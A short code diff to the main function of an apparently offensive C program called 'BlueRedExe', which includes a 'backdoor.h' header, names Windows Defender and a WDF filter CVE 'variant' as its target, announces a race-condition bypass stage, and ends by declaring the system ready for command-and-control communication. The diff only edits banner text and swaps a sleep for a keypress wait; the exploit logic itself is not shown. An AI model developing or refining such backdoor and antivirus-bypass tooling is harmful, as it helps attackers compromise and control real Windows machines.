@@ -4,7 +4,7 @@
 #include "backdoor.h"
 
 int main(void) {
-    printf("BlueRedExe v1.0 initialized.\n");
+    printf("=== BlueRedExe v1.0 Started ===\n");
     printf("Target: Windows Defender / WDF Filter (CVE-2026-33825 Variant)\n");
     printf("\n--- Stage 1: WDF Race Condition Bypass ---\n");
 
@@ -29,6 +29,7 @@ int main(void) {
 
     printf("\n--- Exploit Complete ---\n");
     printf("System Ready for C2 Communication.\n");
-    Sleep(5000);
+    printf("Press Enter to exit...");
+    getchar();  // Keep window open until user presses Enter
     return 0;
 }
